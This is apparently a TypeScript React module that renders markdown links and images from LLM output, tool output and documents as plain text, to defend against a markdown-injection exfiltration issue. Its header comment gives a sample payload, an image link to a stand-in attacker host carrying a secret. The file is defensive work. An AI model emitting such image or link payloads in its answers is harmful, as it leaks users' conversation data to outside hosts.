import { isValidElement, type ReactNode } from "react";
import type { Components } from "react-markdown";
import styles from "./MarkdownRenderer.module.css";

/**
 * Markdown link/image policy (issue #228: markdown injection).
 *
 * Links and images in LLM output, tool output, document content or shared
 * assistant metadata can exfiltrate conversation data: a rendered
 * `![](https://evil.example/?d=secret)` makes the browser send a request to
 * the attacker as soon as it is displayed, and clicking a link can leak the
 * same way. None of these surfaces can be trusted, so markdown links and
 * images render as plain text everywhere: no `<a>` element is created, no
 * `<img>` is ever fetched, the URL stays visible as text.
 */
interface SafeLinkProps {
    href?: string;
    children?: ReactNode;
}

interface SafeImageProps {
    alt?: string;
    src?: string;
    title?: string;
}

const flattenText = (node: ReactNode): string => {
    if (node === null || node === undefined || typeof node === "boolean") return "";
    if (typeof node === "string" || typeof node === "number") return String(node);
    if (Array.isArray(node)) return node.map(flattenText).join("");
    if (isValidElement(node)) return flattenText((node.props as { children?: ReactNode }).children);
    return "";
};

/**
 * Visible text for a neutralized link or image: the label plus the URL in
 * parentheses, unless one of them is empty or the label already contains the
 * URL.
 */
export const describeLinkText = (label: string, url: string): string => {
    const text = label.trim();
    const target = url.trim();
    if (!target) return text;
    if (!text) return target;
    return text.includes(target) ? text : `${text} (${target})`;
};

export const SafeMarkdownLink = ({ href, children }: SafeLinkProps) => {
    const url = (href ?? "").trim();
    if (!url) return <>{children}</>;
    const text = flattenText(children);
    if (text.includes(url)) return <>{children}</>;
    return (
        <>
            {children}
            <span className={styles.linkUrl}> ({url})</span>
        </>
    );
};

export const SafeMarkdownImage = ({ alt, src, title }: SafeImageProps) => {
    const text = describeLinkText((alt ?? "").trim() || (title ?? "").trim(), src ?? "");
    return text ? <span className={styles.linkUrl}>{text}</span> : null;
};

export const safeMarkdownComponents: Components = {
    a: SafeMarkdownLink,
    img: SafeMarkdownImage
};

/** Merge the safe link/image policy with local component overrides. */
export const withSafeMarkdownLinks = (components: Components = {}): Components => ({
    ...safeMarkdownComponents,
    ...components
});

const SPLIT_WITH_FENCES = /(```[\s\S]*?(?:```|$)|~~~[\s\S]*?(?:~~~|$)|`[^`\n]*`)/g;

const transformOutsideFences = (markdown: string, transform: (part: string) => string): string =>
    markdown
        .split(SPLIT_WITH_FENCES)
        .map((part, index) => (index % 2 === 1 ? part : transform(part)))
        .join("");

const stripLinks = (markdown: string): string =>
    markdown
        // images ![alt](url) -> alt
        .replace(/!\[([^\]]*)\]\(([^)]*)\)/g, "$1")
        // inline links [text](url) -> text
        .replace(/\[([^\]]*)\]\(([^)]*)\)/g, "$1")
        // reference links [text][ref] -> text
        .replace(/\[([^\]]+)\]\[[^\]]*\]/g, "$1")
        // autolinks <https://example.com> -> https://example.com
        .replace(/<((?:https?|mailto|xmpp):[^>\s]+)>/g, "$1")
        // link definitions [ref]: url
        .replace(/^\s*\[[^\]]+\]:\s*\S+.*$/gm, "");

/**
 * Neutralize markdown link/image syntax in a plain-text context (e.g. before
 * rendering a mindmap), keeping fenced and inline code untouched.
 */
export const stripMarkdownLinks = (markdown: string): string => transformOutsideFences(markdown, stripLinks);

// Link definitions `[ref]: url`; footnote definitions (`[^1]: …`) are excluded.
const DEFINITION_RE = /^ {0,3}\[([^^][^\]]*)\]:[ \t]*(\S+)[^\S\n]*(?:"[^"]*"|'[^']*'|\([^)]*\))?[^\S\n]*$\n?/gm;

const referenceKey = (label: string): string => label.trim().toLowerCase();

// `[desc](url "title")` — the destination is everything up to the first whitespace.
const destinationOf = (match: string): string => match.trim().split(/\s+/)[0] ?? "";

/**
 * Break markdown links and images down to their visible plain-text form
 * ("description (url)"), the same view the chat answer policy produces.
 * Used where the markdown itself is persisted (canvas editor): the stored
 * document must not contain link/image syntax that could later be rendered
 * or exported as clickable links or fetched images (issue #228). Fenced and
 * inline code are kept untouched.
 */
export const markdownLinksToPlainText = (markdown: string): string =>
    transformOutsideFences(markdown, part => {
        const definitions = new Map<string, string>();
        for (const match of part.matchAll(DEFINITION_RE)) {
            const key = referenceKey(match[1]);
            if (!definitions.has(key)) definitions.set(key, match[2]);
        }

        let text = part;
        // Reference-style images ![alt][ref] and collapsed references [desc][]
        text = text.replace(/!\[([^\]]*)\]\[([^\]]*)\]/g, (_match, alt: string, ref: string) => {
            const url = definitions.get(referenceKey(ref || alt));
            return url ? describeLinkText(alt, url) : alt;
        });
        // Reference links [desc][ref], collapsed [desc][]
        text = text.replace(/\[([^\]]+)\]\[([^\]]*)\]/g, (_match, desc: string, ref: string) => {
            const url = definitions.get(referenceKey(ref || desc));
            return url ? describeLinkText(desc, url) : desc;
        });
        // Images ![alt](url) before links, so [![alt](src)](url) keeps its shape
        text = text.replace(/!\[([^\]]*)\]\(([^)]*)\)/g, (_match, alt: string, url: string) => describeLinkText(alt, destinationOf(url)));
        // Inline links [desc](url)
        text = text.replace(/\[([^\]]*)\]\(([^)]*)\)/g, (_match, desc: string, url: string) => describeLinkText(desc, destinationOf(url)));
        // Autolinks <https://example.com>
        text = text.replace(/<((?:https?|mailto|xmpp):[^>\s]+)>/g, "$1");
        // Definition lines are resolved; footnote definitions stay untouched
        text = text.replace(DEFINITION_RE, "");
        return text;
    });
